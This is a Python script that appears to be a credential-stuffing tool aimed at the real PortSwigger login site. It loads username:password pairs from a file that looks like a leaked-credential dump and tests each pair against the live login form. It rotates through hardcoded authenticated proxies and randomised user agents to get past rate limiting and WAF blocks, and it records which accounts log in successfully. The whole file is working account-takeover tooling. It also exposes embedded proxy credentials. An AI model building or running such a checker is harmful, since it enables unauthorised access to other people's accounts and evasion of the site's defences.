#!/usr/bin/env python3
"""
PortSwigger Login Checker - Rotating Proxy Version
Simple and reliable proxy rotation without Mullvad complications
"""

import requests
import time
import json
import re
import random
from typing import Dict, Optional, Tuple
from datetime import datetime

class PortSwiggerProxyChecker:
    """Login checker with rotating proxy support."""

    # Proxy list - ROTATING
    PROXIES = [
        "http://myagentyltd:Kb5xW8vW2B@66.248.146.48:50100",
        "http://myagentyltd:Kb5xW8vW2B@208.53.9.5:50100",
    ]

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ]

    def __init__(self, rate_limit: float = 2.0, debug: bool = True):
        """
        Initialize with proxy rotation.

        Args:
            rate_limit: Seconds between requests (2.0 = 0.5 req/sec)
            debug: Enable verbose debugging
        """
        self.base_url = "https://login.portswigger.net"
        self.rate_limit = rate_limit
        self.last_request_time = 0
        self.debug = debug
        self.test_results = []
        self.proxy_index = 0
        self.current_proxy = None

        if self.debug:
            print(f"[+] Initialized with {len(self.PROXIES)} proxies")

    def _get_next_proxy(self) -> str:
        """Get next proxy from rotation."""
        self.current_proxy = self.PROXIES[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.PROXIES)
        return self.current_proxy

    def _get_random_user_agent(self) -> str:
        """Get random user agent."""
        return random.choice(self.USER_AGENTS)

    def _get_headers(self) -> Dict:
        """Get request headers."""
        return {
            "User-Agent": self._get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Pragma": "no-cache",
        }

    def _enforce_rate_limit(self) -> None:
        """Enforce rate limiting between requests."""
        elapsed = time.time() - self.last_request_time

        if elapsed < self.rate_limit:
            sleep_time = self.rate_limit - elapsed
            if self.debug:
                print(f"[DEBUG] Rate limit: sleeping {sleep_time:.1f}s")
            time.sleep(sleep_time)

        self.last_request_time = time.time()

    def _extract_form_fields(self, html_content: str) -> Dict[str, str]:
        """Extract all form fields from HTML."""
        fields = {}

        for match in re.finditer(r'<input[^>]*>', html_content):
            input_tag = match.group(0)
            name_match = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', input_tag, re.IGNORECASE)
            value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag)

            if not value_match:
                value_match = re.search(r'value\s*=\s*([^"\'\s>]+)', input_tag)

            if name_match:
                field_name = name_match.group(1)
                field_value = value_match.group(1) if value_match else ""
                fields[field_name] = field_value

        return fields

    def _check_for_waf(self, status_code: int, html: str) -> Tuple[bool, str]:
        """Check if WAF blocked the request."""
        if status_code == 403:
            return True, "HTTP 403 (WAF/IP blocked)"
        if status_code == 429:
            return True, "HTTP 429 (Rate limited)"
        if "blocked" in html.lower() or "forbidden" in html.lower():
            return True, "WAF content detected"
        return False, ""

    def check_login(self, username: str, password: str) -> Dict:
        """Test login with proxy rotation."""

        result = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "status": "UNKNOWN",
            "proxy": None,
            "attempts": 0,
        }

        # Get rotating proxy
        proxy_url = self._get_next_proxy()
        result["proxy"] = proxy_url.split("@")[1] if "@" in proxy_url else proxy_url

        if self.debug:
            print(f"[DEBUG] Using proxy: {result['proxy']}")

        try:
            # Create session with proxy
            session = requests.Session()
            proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }
            session.proxies.update(proxies)

            headers = self._get_headers()
            self._enforce_rate_limit()

            # Step 1: GET /u/login
            if self.debug:
                print(f"[DEBUG] GET /u/login...")

            try:
                init_response = session.get(
                    f"{self.base_url}/u/login",
                    headers=headers,
                    timeout=30,
                    allow_redirects=True,
                    verify=True
                )
            except requests.exceptions.Timeout:
                result["status"] = "TIMEOUT"
                result["error"] = "GET /u/login timeout"
                self.test_results.append(result)
                return result
            except requests.exceptions.ConnectionError as e:
                result["status"] = "CONNECTION_ERROR"
                result["error"] = str(e)
                self.test_results.append(result)
                return result

            if self.debug:
                print(f"[DEBUG] GET response: {init_response.status_code}")

            # Check for WAF
            is_waf, waf_msg = self._check_for_waf(init_response.status_code, init_response.text)
            if is_waf:
                result["status"] = "WAF_BLOCKED"
                result["error"] = waf_msg
                if self.debug:
                    print(f"[DEBUG] ⚠️  {waf_msg}")
                self.test_results.append(result)
                return result

            # Extract form fields
            form_fields = self._extract_form_fields(init_response.text)
            if not form_fields:
                form_fields = {}

            if self.debug and form_fields:
                print(f"[DEBUG] Extracted fields: {list(form_fields.keys())}")

            # Step 2: POST credentials
            self._enforce_rate_limit()

            payload = form_fields.copy()
            payload["username"] = username
            payload["password"] = password

            if "action" not in payload:
                payload["action"] = "default"

            headers["Referer"] = f"{self.base_url}/u/login"
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            if self.debug:
                print(f"[DEBUG] POST /u/login...")

            try:
                response = session.post(
                    f"{self.base_url}/u/login",
                    data=payload,
                    headers=headers,
                    timeout=30,
                    allow_redirects=False,
                    verify=True
                )
            except requests.exceptions.Timeout:
                result["status"] = "TIMEOUT"
                result["error"] = "POST /u/login timeout"
                self.test_results.append(result)
                return result
            except requests.exceptions.ConnectionError as e:
                result["status"] = "CONNECTION_ERROR"
                result["error"] = str(e)
                self.test_results.append(result)
                return result

            if self.debug:
                print(f"[DEBUG] POST response: {response.status_code}")

            # Check for WAF again
            is_waf, waf_msg = self._check_for_waf(response.status_code, response.text)
            if is_waf:
                result["status"] = "WAF_BLOCKED"
                result["error"] = waf_msg
                if self.debug:
                    print(f"[DEBUG] ⚠️  {waf_msg}")
                self.test_results.append(result)
                return result

            # Analyze login response
            if response.status_code == 302 or response.status_code == 303:
                redirect = response.headers.get("Location", "")

                if "error" in redirect.lower():
                    result["status"] = "FAILED_LOGIN"
                    result["error"] = "Login error in redirect"
                else:
                    result["status"] = "SUCCESS"
                    result["redirect"] = redirect[:100]

            elif response.status_code == 200:
                # Still on login page
                if "error" in response.text.lower() or "invalid" in response.text.lower():
                    result["status"] = "FAILED_LOGIN"
                    result["error"] = "Invalid credentials"
                else:
                    result["status"] = "LOGIN_PAGE"

            elif response.status_code == 400:
                result["status"] = "FAILED_LOGIN"
                result["error"] = "HTTP 400 - Bad request"

            elif response.status_code == 403:
                result["status"] = "FORBIDDEN"
                result["error"] = "HTTP 403"

            elif response.status_code == 429:
                result["status"] = "RATE_LIMITED"
                result["error"] = "Rate limit exceeded"

            else:
                result["status"] = f"HTTP_{response.status_code}"

        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            if self.debug:
                print(f"[DEBUG] Exception: {e}")

        self.test_results.append(result)
        return result

    def check_multiple_accounts(self, credentials_list: list) -> list:
        """Test multiple accounts with proxy rotation."""
        print(f"\n[*] PortSwigger Login Checker - Proxy Rotation")
        print(f"[*] Total accounts: {len(credentials_list)}")
        print(f"[*] Proxies: {len(self.PROXIES)}")
        print(f"[*] Rate limit: {self.rate_limit}s ({1/self.rate_limit:.2f} req/sec)")
        print("-" * 70)

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "")
            password = creds.get("password", "")

            print(f"\n[{idx}/{len(credentials_list)}] Testing: {username}")
            result = self.check_login(username, password)

            status_symbol = "✓" if result["status"] == "SUCCESS" else "✗"
            print(f"    {status_symbol} Status: {result['status']}")
            print(f"    Proxy: {result['proxy']}")

            if result.get('error'):
                print(f"    Error: {result['error']}")

            if result.get('redirect'):
                print(f"    Redirect: {result['redirect']}")

        print("\n" + "=" * 70)
        return self.test_results

    def get_summary(self) -> Dict:
        """Get summary statistics."""
        if not self.test_results:
            return {"total": 0}

        return {
            "total": len(self.test_results),
            "successful": sum(1 for r in self.test_results if r["status"] == "SUCCESS"),
            "failed": sum(1 for r in self.test_results if r["status"] == "FAILED_LOGIN"),
            "waf_blocked": sum(1 for r in self.test_results if r["status"] == "WAF_BLOCKED"),
            "errors": sum(1 for r in self.test_results if "ERROR" in r["status"]),
            "rate_limited": sum(1 for r in self.test_results if r["status"] == "RATE_LIMITED"),
        }

    def export_results(self, filename: str = "portswigger_proxy_results.json") -> None:
        """Export results to JSON."""
        with open(filename, 'w') as f:
            json.dump({
                "results": self.test_results,
                "summary": self.get_summary(),
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
        print(f"[+] Results exported to: {filename}")


def main():
    """Main entry point."""
    debug_mode = True

    checker = PortSwiggerProxyChecker(
        rate_limit=2.0,  # 0.5 req/sec (safe)
        debug=debug_mode
    )

    # Read credentials
    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    parts = line.split(":", 1)
                    test_credentials.append({
                        "username": parts[0].strip(),
                        "password": parts[1].strip()
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials in {log_file}")
            return

        print(f"[+] Loaded {len(test_credentials)} credentials\n")

        # Optional: limit for testing
        # test_credentials = test_credentials[:50]

    except FileNotFoundError:
        print(f"[ERROR] {log_file} not found")
        return

    # Run tests
    results = checker.check_multiple_accounts(test_credentials)

    # Print summary
    summary = checker.get_summary()
    print(f"\n[SUMMARY]")
    print(f"Total: {summary['total']}")
    print(f"Successful: {summary['successful']}")
    print(f"Failed: {summary['failed']}")
    print(f"WAF Blocked: {summary['waf_blocked']}")
    print(f"Rate Limited: {summary['rate_limited']}")
    print(f"Errors: {summary['errors']}")

    # Export
    checker.export_results()


if __name__ == "__main__":
    main()
